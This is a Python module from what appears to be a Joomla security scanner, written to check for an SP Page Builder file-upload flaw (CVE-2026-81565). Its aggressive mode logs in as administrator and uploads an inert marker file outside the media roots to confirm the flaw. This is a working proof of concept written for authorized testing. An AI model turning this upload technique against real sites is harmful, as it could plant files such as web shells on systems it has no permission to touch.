from __future__ import annotations

import json
import re
import secrets
from typing import Any

from ...core.http import (
    HttpClient,
    build_multipart,
    form_encode,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-81565"
NAME = "SP Page Builder media upload to unintended directories"
COMPONENT = "SP Page Builder"
AFFECTED_RULE = "SP Page Builder 4.0.0 through 6.9.0; fixed in 6.9.1"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
ADMIN_LOGIN = "/administrator/index.php"
MEDIA_ENDPOINT = "/administrator/index.php?option=com_sppagebuilder&task=editor.media"
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"|"csrf\.token":"([a-f0-9]{32})"')
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.9.1")
    first_affected = parse_version_safe("4.0.0")
    if parsed is None or fixed is None or first_affected is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < first_affected:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("sppagebuilder", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="SP Page Builder was not detected through its public manifest or asset paths.", action="No action is required unless SP Page Builder is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected SP Page Builder {version}, within the affected range below 6.9.1. The media endpoint accepts a request-supplied folder and writes outside the configured media roots."
        action = "Upgrade SP Page Builder to 6.9.1 or newer and remove unexpected files from the web root."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected SP Page Builder {version}, which validates the upload folder with SecurityHelper::isGetablePath()."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "SP Page Builder was detected, but its version could not be determined."
        action = "Determine the installed SP Page Builder version and upgrade to 6.9.1 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _token(body: str) -> str | None:
    match = TOKEN_RE.search(body)
    if not match:
        return None
    return match.group(1) or match.group(2)


def _admin_login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> str | None:
    page = client.get(f"{base}{ADMIN_LOGIN}", timeout=timeout)
    if is_transport_error(page):
        return None
    login_token = _token(page.get("body") or "")
    if not login_token:
        return None
    response = client.request(
        f"{base}{ADMIN_LOGIN}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": BROWSER_UA},
        data=form_encode(
            {
                "username": username,
                "passwd": password,
                "option": "com_login",
                "task": "login",
                "return": "aW5kZXgucGhw",
                login_token: "1",
            }
        ),
        timeout=timeout,
    )
    if is_transport_error(response):
        return None
    page = client.get(f"{base}{ADMIN_LOGIN}", timeout=timeout)
    if is_transport_error(page):
        return None
    return _token(page.get("body") or "")


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    folder: str = "tmp",
    timeout: int = 15,
    proxy: str | None = None,
) -> Finding:
    """Upload a marker file into a request-supplied folder.

    SP Page Builder 6.9.0 and earlier pass the ``folder`` request value to
    ``Folder::create()`` and ``File::upload()`` under ``JPATH_ROOT`` without
    checking it against the media roots. 6.9.1 calls
    ``SecurityHelper::isGetablePath($dir)`` and rejects the upload. The probe
    uses an inert ``.json`` marker and a folder outside the media roots.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{ADMIN_LOGIN}", detail="The upload proof needs an administrator session with core.create on com_sppagebuilder. Pass --aggressive-arg username=... password=... on an authorized staging site. Nothing was sent.", action="Re-run with lab administrator credentials.")

    client = HttpClient(timeout=timeout, proxy=proxy)
    token = _admin_login(client, base, username, password, timeout)
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{ADMIN_LOGIN}", detail="The administrator login did not establish a session or expose a CSRF token; the upload probe was not attempted.", action="Verify the lab credentials and administrator login route.")

    suffix = secrets.token_hex(4)
    filename = f"proofcms-81565-{suffix}.json"
    marker = f"PROOFCMS_81565_{suffix.upper()}"
    content_type, body = build_multipart(
        {"_method": "POST", "folder": folder, token: "1"},
        {"file[]": (filename, marker.encode(), "application/json")},
    )
    response = client.request(
        f"{base}{MEDIA_ENDPOINT}",
        method="POST",
        headers={"Content-Type": content_type, "User-Agent": BROWSER_UA},
        data=body,
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{MEDIA_ENDPOINT}", detail=f"The media upload request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body_text = response.get("body") or ""
    try:
        parsed = json.loads(body_text)
    except (json.JSONDecodeError, TypeError):
        parsed = {}
    data = parsed.get("data") if isinstance(parsed, dict) else None
    accepted = bool(isinstance(data, dict) and data.get("status") is True)
    uploaded_path = data.get("path") if isinstance(data, dict) else None
    file_url = f"{base}/{str(uploaded_path).lstrip('/')}" if uploaded_path else f"{base}/{folder}/{filename}"
    served = client.get(file_url, timeout=timeout)
    served_status = 0 if is_transport_error(served) else served.get("status", 0)
    served_body = "" if is_transport_error(served) else (served.get("body") or "")
    served_marker = marker in served_body

    evidence = {
        "folder": folder,
        "filename": filename,
        "upload_status": response.get("status"),
        "upload_accepted": accepted,
        "uploaded_path": uploaded_path,
        "file_url": file_url,
        "file_status": served_status,
        "marker_served": served_marker,
    }
    if accepted and served_marker:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=file_url,
            evidence=evidence,
            detail=(
                "An authenticated media upload used the request-supplied folder to write a marker outside the "
                "configured media roots, and the file was served back from the web root. 6.9.1 rejects the folder "
                "through SecurityHelper::isGetablePath()."
            ),
            action="Upgrade SP Page Builder to 6.9.1 or newer and remove the uploaded file.",
        )
    status = "BLOCKED_EXTERNAL" if response.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{MEDIA_ENDPOINT}",
        evidence=evidence,
        detail="The media upload was rejected or the marker was not served; 6.9.1 validates the folder before writing.",
        action="Upgrade affected SP Page Builder versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}{ADMIN_LOGIN}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The administrator page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The administrator page is reachable; the media upload payload was not sent in safe mode.", action="Use aggressive mode with administrator credentials on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 15, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because SP Page Builder was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            folder=aggressive_value(aggressive_args, aggressive_command, "folder") or "tmp",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (administrator reachability) and aggressive (media upload to an unintended folder) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Unrestricted File Upload", "module_version": "1.0.0", "last_reviewed": "2026-11-18", "updated": "2026-11-18", "required_detectors": ["sppagebuilder"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-81565", "https://www.joomshaper.com/joomla-templates/sp-page-builder", "https://joomshaper.com/forum/question/46614"]}
